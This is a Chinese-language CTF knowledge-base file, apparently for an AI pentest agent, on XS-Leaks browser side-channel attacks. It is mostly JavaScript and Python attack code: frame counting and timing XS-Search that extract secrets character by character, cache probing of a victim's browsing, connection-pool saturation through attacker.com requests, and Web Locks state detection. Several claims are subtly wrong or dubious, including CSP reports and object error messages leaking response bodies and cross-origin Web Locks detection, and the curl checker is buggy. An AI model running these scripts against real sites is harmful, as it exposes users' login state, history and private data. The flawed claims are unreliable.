# XS-Leaks 浏览器侧信道攻击

## 场景

目标站点存在跨域隔离缺陷，攻击者可以通过浏览器的侧信道机制，在不破坏同源策略的前提下，检测出跨域资源的内部状态。CTF 中利用 XS-Leaks 可以在无需 XSS 的情况下窃取搜索查询结果、用户登录状态、CSRF token 值等敏感信息。

## 输入信号

```
目标页面在不同状态（登录/未登录、命中/未命中）下的响应差异
目标未设置 Cross-Origin-Resource-Policy (CORP) / Cross-Origin-Opener-Policy (COOP)
目标未启用 COEP (Cross-Origin-Embedder-Policy)
目标存在可通过 iframe 嵌入的页面 (X-Frame-Options 未设置 / 设置为 ALLOWALL)
目标未设置 SameSite=Strict cookie
目标存在搜索/API 端点，查询结果因关键词不同而响应不同
页面内存在可缓存的资源，且 Cache-Control 允许共享缓存
```

## 1. Frame Counting (window.length)

当页面可被跨域 iframe 嵌入时，攻击者可以通过 `window.frames.length` 检测目标页面的内部状态差异。

```javascript
// frame_counting.js — 通过框架计数检测页面状态
// 原理: 目标页面在不同状态下包含不同数量的 iframe/subframes

function detect_state(target_url, varying_condition) {
    // 创建 iframe 并检测其内部 frame 数量
    return new Promise((resolve) => {
        const iframe = document.createElement('iframe');
        iframe.src = target_url;
        iframe.style.display = 'none';
        iframe.onload = () => {
            // 跨域: 只能读取 iframe 的 frames.length
            const frameCount = iframe.contentWindow.length; // 跨域不报错!
            resolve(frameCount);
        };
        document.body.appendChild(iframe);
    });
}

// 场景: https://target.com/search?q=flag 在命中时页面有 3 个 iframe
//       未命中时页面有 0 个 iframe
// 攻击者枚举搜索条件来检测哪个查询命中了
async function binary_search_flag() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789_-{}';
    let flag = 'flag{';
    
    while (!flag.includes('}')) {
        for (const c of chars) {
            const guess = flag + c;
            const count = await detect_state(
                `https://target.com/search?q=${encodeURIComponent(guess)}`,
                'frame_diff'
            );
            if (count >= 3) { // 命中时才有 3 个 iframe
                flag += c;
                break;
            }
        }
    }
    return flag;
}
```

### window.name Leak

```javascript
// 通过 iframe 导航 → 目标页面写入 window.name → 攻击者读取
// 仅当目标页面显式设置了 window.name (不常见)
```

## 2. Cache Probing — 定时攻击

通过检测资源是否被缓存，推断目标用户之前访问过哪些页面。

```javascript
// cache_probe.js — 跨域缓存探测
// 原理: 缓存资源加载快 (<10ms)，未缓存资源加载慢 (>100ms)
// 利用 performance.now() 或 Date 计时

function cache_probe(url, threshold = 30) {
    return new Promise((resolve) => {
        const start = performance.now();
        const img = new Image();
        img.onload = img.onerror = () => {
            const elapsed = performance.now() - start;
            resolve(elapsed < threshold); // 快 = 缓存命中
        };
        img.src = url;
    });
}

// 场景: 检测用户是否访问过特定页面
async function detect_visited_pages() {
    const targets = [
        'https://target.com/admin/dashboard',
        'https://target.com/settings/security',
        'https://target.com/profile/private',
    ];
    
    const results = {};
    for (const page of targets) {
        // 通过探测页面中的静态资源来判断
        // 通常探测: favicon.ico, style.css, logo.png
        const probeUrl = page + '/favicon.ico'; // 或已知的缓存资源
        const isCached = await cache_probe(probeUrl);
        results[page] = isCached;
    }
    return results;
}
```

### Timing-Based XS-Search

```javascript
// XS-Search: 利用搜索 API 响应时间的差异逐字符推断搜索结果
// 条件: 搜索接口在 JSON 结果长度不同时有不同的响应时间

async function xs_search_timing(base_url, endpoint, query_param, known_prefix) {
    // 假设: search?q=flag{a} 与 search?q=flag{b} 的响应时间不同
    // 因为匹配 A 的结果多于 B → JSON 更大 → 响应更慢
    
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789_-!@#$%^&*(){}';
    const measurements = [];
    
    for (const c of chars) {
        const url = `${base_url}${endpoint}?${query_param}=${encodeURIComponent(known_prefix + c)}`;
        
        // 使用多个测量取中位数，消除网络抖动
        const times = [];
        for (let i = 0; i < 30; i++) {
            const start = performance.now();
            await fetch(url, {mode: 'no-cors', credentials: 'include'});
            times.push(performance.now() - start);
        }
        times.sort((a, b) => a - b);
        const median = times[15]; // 中位数
        
        measurements.push({char: c, time: median});
    }
    
    // 排序: 耗时最长的字符最有可能是匹配的结果
    measurements.sort((a, b) => b.time - a.time);
    return measurements.slice(0, 3); // Top 3 candidates
}
```

## 3. CORP/CORB Bypass

Cross-Origin-Read-Blocking (CORB) 和 Cross-Origin-Resource-Policy (CORP) 保护机制配置不当，导致攻击者可以跨域读取响应体。

```javascript
// CORB bypass via content-type confusion
// CORB 会在响应体被跨域读取时阻止以下 MIME 类型:
// - text/html
// - application/json
// - text/xml, application/xml
// 但 CORB 不阻止: image/*, audio/*, video/*, application/octet-stream

// 绕过 1: 将 JSON 端点改为返回 Content-Type: image/png
// 或 Content-Type: text/plain (CORB 不阻止 text/plain)

// 绕过 2: iframe + window.open + X-Frame-Options 缺失
// 直接嵌入 HTML 页面并观察 onload 事件

// 绕过 3: 利用 <object> / <embed> 标签处理不支持类型时的错误消息
// <object data="https://target.com/api/secret">
// 加载失败时的错误信息可能包含部分响应内容
```

```javascript
// CORP bypass via no-cors + script tag
// 如果 API 返回 JSON 但 Content-Type 是 application/javascript
// → 可以跨域通过 <script> 加载 → 但 JSON 作为 JS 解析会报错

// 但如果 JSON 格式恰好是有效的 JS (如 [1,2,3] 或 {"a":1}.constructor)
// → 可通过 Service Worker 或 __proto__ 来拦截

// 更实际: script tag 配合 JSONP → 直接跨域读取
// 如果 API 有 JSONP 支持 → 直接跨域读取完整数据

// 终极 bypass: 利用 CSP violation 报告泄露
// <script src="https://target.com/api/data">
// 如果 CSP 报告接口设置了 report-uri → CSP 报告中将包含被阻止脚本的部分内容
```

## 4. Performance API Leaks

`performance.getEntriesByType('resource')` 和 `performance.getEntriesByType('navigation')` 可以跨域泄露资源信息。

```javascript
// performance_api_leak.js
// 原理: 即使页面被重定向，Performance API 仍然保留原始资源时间

function detect_redirect_chain(target_url) {
    const img = new Image();
    img.src = target_url; // 可能发生 302 重定向
    
    // 异步检测: 通过 performance API 查看资源
    setTimeout(() => {
        const entries = performance.getEntriesByName(target_url);
        if (entries.length > 0) {
            const entry = entries[0];
            // redirectStart, redirectEnd, domainLookupStart, 等
            // 通过 redirectCount 判断是否有重定向
            console.log('Redirect:', entry.redirectStart > 0);
            console.log('Duration:', entry.duration);
            // 可通过 duration 的差异判断重定向目标不同 → 状态不同
        }
    }, 100);
}
```

### Navigation Timing Leak

```javascript
// 利用 navigation timing 检测 iframe 加载情况
// 跨域 iframe 的 performance 不可直接读取
// 但通过 loaded 事件的时间差 (onload 执行时机) 可推断

// 更精确: 利用 iframe 的 onload 与资源 timing 结合

// PerformanceObserver + largest-contentful-paint
// 可跨域读取 iframe 内内容的 LCP 时间
// → 通过 LCP 时间推测页面复杂度 → 推测页面状态
```

## 5. Scroll-to-Text-Fragment Side Channel

```javascript
// 利用 #:~:text= 片段标识符进行跨域检测
// 场景: 目标页面包含特定文本时，滚动到该文本

function scroll_to_text_fragment_leak(target_url, search_text) {
    // 构造 scroll-to-text URL
    const url = `${target_url}#:~:text=${encodeURIComponent(search_text)}`;
    
    // 打开窗口并检测是否发生了滚动事件
    const win = window.open(url, 'target', 'width=400,height=300');
    
    // 通过检测目标窗口是否滚动到特定位置来推断文本存在
    // 方法: 创建一个同名窗口覆盖原来的 → 利用 postMessage 获取滚动位置
    // 更简单: 如果目标页面在 onload 时检查 hash → 可被 iframe 检测
    
    // scroll-to-text-fragment 存在时，浏览器会请求 scroll 到匹配文本
    // 如果文本不存在 → 不滚动
    // 某些浏览器 (Chrome) 会修改 performance 数据
}
```

### Lazy-Load iframe Detection

```javascript
// HTML5 iframe loading="lazy" 属性导致 iframe 只在该视图附近时加载
// 攻击者可利用此特性检测目标页面元素位置

function lazy_load_detect(target_url) {
    const iframe = document.createElement('iframe');
    iframe.loading = 'lazy';
    iframe.src = target_url;
    iframe.style.position = 'absolute';
    iframe.style.top = '-10000px'; // 在可视区域外 → 不会加载
    
    // 检测 onload 是否被触发 → 判断浏览器是否遵守 lazy-load
    // 如果 onload 未触发 → 元素在视口外且浏览器支持 lazy-load
    
    // 可推论: 如果目标页面有 lazy 加载的 iframe, 攻击者可控制
    // 用户的滚动位置来选择性加载特定内容
}
```

## 6. XS-Search via API Timing

结合定时攻击和内容检测，通过多次测量精确推断 API 返回值。

```python
# xs_search_harness.py — XS-Search 自动化检测框架
import asyncio
import aiohttp
import statistics
import urllib.parse

class XSSearchEngine:
    """跨域搜索推断引擎"""
    
    def __init__(self, base_url, endpoint, query_param):
        self.base_url = base_url
        self.endpoint = endpoint
        self.query_param = query_param
        self.baseline_time = None
        
    async def measure(self, query, samples=50):
        """对特定查询进行多次测量"""
        url = f"{self.base_url}{self.endpoint}?{self.query_param}={urllib.parse.quote(query)}"
        times = []
        
        async with aiohttp.ClientSession() as session:
            for _ in range(samples):
                start = asyncio.get_event_loop().time()
                try:
                    async with session.get(url) as resp:
                        await resp.read()
                except:
                    pass
                elapsed = asyncio.get_event_loop().time() - start
                times.append(elapsed)
        
        # 剔除异常值 (取中间 60% 的数据)
        times.sort()
        trimmed = times[len(times)//5 : -len(times)//5]
        return statistics.median(trimmed), statistics.stdev(trimmed)
    
    def normalize(self, median, baseline_median):
        """归一化消噪"""
        return (median - baseline_median) / baseline_median * 100
    
    async def binary_search(self, prefix="", charset=None):
        """二分查找推断完整字符串"""
        if charset is None:
            charset = "abcdefghijklmnopqrstuvwxyz0123456789_-{}"
        
        # 第一轮: 建立基线
        self.baseline_time, _ = await self.measure("no_such_string_possible_xyz")
        
        result = prefix
        while True:
            measurements = []
            for c in charset:
                test = result + c
                median, _ = await self.measure(test)
                normalized = self.normalize(median, self.baseline_time)
                measurements.append((c, normalized))
            
            # 取归一化时间最长的字符作为最可能的匹配
            measurements.sort(key=lambda x: x[1], reverse=True)
            best_char, best_score = measurements[0]
            
            # 置信度阈值: 如果最佳字符的得分明显高于其他
            second_best = measurements[1][1] if len(measurements) > 1 else 0
            
            if best_score > second_best + 0.5:  # 置信度足够
                result += best_char
                print(f"Found: {result}")
                if best_char == '}':
                    break
            else:
                # 低置信度 — 需要更多样本或这条路径不对
                print(f"Low confidence at: {result}, best: {best_char}({best_score:.2f}%) vs second: {second_best:.2f}%")
                break
        
        return result
```

## 7. Connection Pool Timing

利用浏览器连接池的竞争条件来推断跨域请求的处理状态。

```javascript
// connection_pool_timing.js
// 浏览器对同一 origin 有最大连接数限制 (通常 6-10)
// 攻击者可占满连接池，观察目标请求的阻塞情况

async function connection_pool_leak(target_url) {
    // 步骤 1: 生成大量对攻击者服务器的请求，占满连接池
    const blockers = [];
    for (let i = 0; i < 40; i++) {
        blockers.push(fetch(`https://attacker.com/block?i=${i}?x=${Math.random()}`));
    }
    
    // 步骤 2: 发送目标请求，测量其排队时间
    const start = performance.now();
    await fetch(target_url, {mode: 'no-cors', credentials: 'include'});
    const latency = performance.now() - start;
    
    // 步骤 3: 释放阻塞请求
    // 如果目标请求是长连接 (SSE, WebSocket) → 占用连接池时间更长
    // → 导致后续请求被阻塞 → 可被检测
    
    return latency;
}
```

## 8. Web Locks API Leak

```javascript
// Web Locks API: navigator.locks.request 可在跨域上下文中检测锁是否存在
// 如果目标页面持有命名锁，攻击者可尝试获取同名锁 → 检测是否被占用

async function detect_lock(lock_name) {
    // 尝试获取锁，immediately 参数表示如果不能立即获取则返回 null
    const lock = await navigator.locks.request(lock_name, {
        ifAvailable: true  // 立即返回，不等待
    }, async () => {
        // 如果获取到锁 (原锁不存在)
        return 'acquired';
    });
    
    return lock === null; // null = 锁被占用 → 目标页持有锁
}

// 场景: 目标页面在加载特定敏感状态时持有名为 "state_xyz" 的 Web Lock
// 攻击者通过 iframe 加载目标页面并检测锁的存在
async function detect_state_via_web_locks(target_url) {
    const iframe = document.createElement('iframe');
    iframe.src = target_url;
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    
    await new Promise(r => setTimeout(r, 1000)); // 等待 iframe 加载
    
    // 尝试检测锁
    const lockHeld = await detect_lock('user_session_lock');
    return lockHeld; // 如果为 true → 用户有活跃 session
}
```

## 9. Real Research Papers & PoCs

### The Cookie Jar Framework (USENIX 2022)
```
论文: "The Cookie Jar: A Framework for Cross-Site Cookie Leaks"
PoC: 利用 SameSite=None 的 cookie 在子域名间共享
→ 攻击站点检测目标用户的登录状态
→ 通过 302 redirect 到 HTTPS 时的 cookie 附加行为
```

### XS-Leaks Wiki (https://xsleaks.dev)
```
完整的技术分类与 PoC 集合:
- Timing: 响应时间、执行时间、cache 命中
- Error: onload/onerror 事件、no-cors 错误
- Frame: frame 计数、navigation 时间
- API: Performance API、CSS Font Loading API
- Storage: localStorage 访问尝试、cookie 前缀
```

### Connection Pool + Compression Side Channel
```
CHES2021: "Compression Side Channels in Modern Browsers"
利用 HTTP 压缩算法的长度差异泄露跨域数据
PoC: Brotli 压缩 → "hello admin" vs "hello user" 压缩后长度不同
→ Content-Type: text/html 的 API 响应经压缩后长度差异
→ no-cors fetch + Content-Encoding 检测
```

```python
# 综合 XS-Leak 检测器
def check_xs_leak_vulnerabilities(target_url):
    """检查目标是否存在 XS-Leak 风险"""
    checks = {
        "corp_not_set": f"curl -sI {target_url} | grep -i 'cross-origin-resource-policy'",
        "coop_not_set": f"curl -sI {target_url} | grep -i 'cross-origin-opener-policy'",
        "coep_not_set": f"curl -sI {target_url} | grep -i 'cross-origin-embedder-policy'",
        "xfo_missing": f"curl -sI {target_url} | grep -i 'x-frame-options'",
        "cache_shared": f"curl -sI {target_url} | grep -i 'cache-control' | grep -i 'public'",
        "samesite_lax": f"curl -sI {target_url} | grep -i 'set-cookie' | grep -i 'samesite'",
    }
    
    results = {}
    for check, cmd in checks.items():
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        results[check] = len(result.stdout) == 0  # 无保护头 = 有风险
    return results
```

## 攻击链

```
Frame counting → iframe 检测 → 页面状态差异 → 信息泄露
Cache probing → 资源缓存状态 → 用户访问历史 → 隐私泄露
CORP 缺失 → 跨域资源读取 → API 响应窃取 → 敏感数据泄露
XS-Search timing → 搜索响应时间差异 → 逐字符推断搜索结果
Performance API → Navigation timing → 重定向链差异 → 登录状态检测
Scroll-to-text-fragment → 文本存在性检测 → 秘密内容验证 → XS-Leak
Web Locks API → 锁状态检测 → 用户活动状态 → 在线/离线检测
Connection pool → 连接竞争 → 长连接检测 → WebSocket/SSE 活动推断
```

## 证据

记录: 目标页面 URL、可嵌入状态 (X-Frame-Options/CORP/COOP/COEP)、检测到的差异维度 (timing/frame/API)、PoC 脚本输出、每位字符推断耗时表格、最终泄露数据的敏感级别。

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 目标响应头探测 | `http_probe` | HTTP GET 探测 CORS/CORP/COOP 保护头 |
| XS-Leak 知识检索 | `kb_router` | 按 XS-Leak 技术名搜索知识库 |
| 具体技术文件 | `kb_read_file` | 读取相关技术文件的代码示例 |
| 辅助探测 | `run_ctf_tool` | 使用 dirsearch/jwt_tool 等工具探测端点 |
